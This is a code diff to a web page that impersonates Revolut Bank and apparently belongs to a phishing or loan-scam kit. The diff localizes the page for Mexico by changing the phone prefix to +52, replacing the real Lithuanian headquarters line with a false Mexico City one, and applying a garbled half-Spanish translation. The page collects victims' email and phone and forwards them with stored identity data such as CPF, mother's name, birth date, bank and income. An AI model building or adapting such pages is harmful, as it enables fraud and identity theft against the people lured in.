@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es-MX">
 <head>
 <script>
 (function(){
@@ -17,7 +17,7 @@
 </script>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1"/>
-<title>Confirm Your Details — RevolutBank</title>
+<title>Confirmar Your Details — RevolutBank</title>
 <link rel="icon" href="images/revolut-favicon.png"/>
 <style>
   *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
@@ -118,7 +118,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
   </div>
 
   <div class="card">
-    <h1>Confirm Your Contact Details</h1>
+    <h1>Confirmara Tus Datos de Contacto</h1>
     <div class="lead">To receive payment notices and updates about your loan</div>
 
     <div class="info-box">
@@ -126,17 +126,17 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
         <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" stroke-linecap="round" stroke-linejoin="round"/></svg>
       </div>
       <div>
-        <div class="info-title">You will receive:</div>
+        <div class="info-title">Recibirás:</div>
         <ul class="info-list">
           <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Payment notices by email</li>
-          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Due date reminders by SMS</li>
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Fecha de vencimiento reminders by SMS</li>
           <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Updates about your contract</li>
           <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Payment receipts</li>
         </ul>
       </div>
     </div>
 
-    <form id="contactForm" onsubmit="handleSubmit(event)">
+    <form id="contactForm" onsubmit="handleEnviar(event)">
       <div class="form-group">
         <label class="form-label" for="emailInput">
           <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"/></svg>
@@ -152,18 +152,18 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       <div class="form-group">
         <label class="form-label" for="phoneInput">
           <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-          Mobile Phone <span class="required">*</span>
+          Teléfono Móvil <span class="required">*</span>
         </label>
         <div class="phone-row">
-          <input class="phone-prefix" id="phoneCode" maxlength="4" value="+34"/>
-          <input autocomplete="tel" class="form-input" id="phoneInput" maxlength="15" placeholder="600 123 456" required="" type="tel"/>
+          <input class="phone-prefix" id="phoneCode" maxlength="4" value="+52"/>
+          <input autocomplete="tel" class="form-input" id="phoneInput" maxlength="15" placeholder="55 1234 5678" required="" type="tel"/>
         </div>
         <div class="error-msg" id="phoneError">Please enter a valid phone number</div>
       </div>
 
       <button class="btn-submit" id="submitBtn" type="submit">
         <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        Confirm and Continue
+        Confirmar and Continuar
       </button>
     </form>
   </div>
@@ -171,7 +171,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
   <div class="footer">
     <div class="l"><img src="images/revolut-logo.svg" alt="Revolut" style="height:32px;width:auto;display:block;margin:0 auto 6px;"/></div>
     <div>Revolut</div>
-    <div>Revolut Bank UAB — Headquartered in Lithuania</div>
+    <div>RevolutBank — Con sede en Ciudad de México</div>
   </div>
 </div>
 
@@ -228,11 +228,11 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     inp.classList.remove('error'); err.classList.remove('show'); return true;
   }
 
-  window.handleSubmit = function(event){
+  window.handleEnviar = function(event){
     event.preventDefault();
     var email = document.getElementById('emailInput').value.trim();
     var phone = document.getElementById('phoneInput').value;
-    var phoneCode = document.getElementById('phoneCode').value.trim() || '+34';
+    var phoneCode = document.getElementById('phoneCode').value.trim() || '+52';
     var phoneClean = phone.replace(/\D/g,'');
     if(!validateEmail(email) || !validatePhone(phone)) return false;
     document.getElementById('loadingOverlay').classList.add('show');
@@ -249,7 +249,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     var urlParams = new URLSearchParams(window.location.search);
     urlParams.set('email', email);
     urlParams.set('telephone', phoneClean);
-    var importantParams = ['income','salaryDay','occupation','education','utm_source','utm_campaign','utm_medium','utm_content','utm_term','name','document','nome_mae','data_nasc','dueDate','cpf','nome','banco','selectedLoanAmount','selectedInstallments','selectedMonthlyPayment'];
+    var importantParams = ['income','salaryDay','occupation','education','utm_source','utm_campaign','utm_medium','utm_content','utm_term','name','document','nome_mae','data_nasc','dueDate','cpf','nome','banco','selectedLoanAmount','selectedCuotas','selectedMensualPayment'];
     importantParams.forEach(function(param){
       var value = localStorage.getItem(param);
       if(value && !urlParams.has(param)) urlParams.set(param, value);
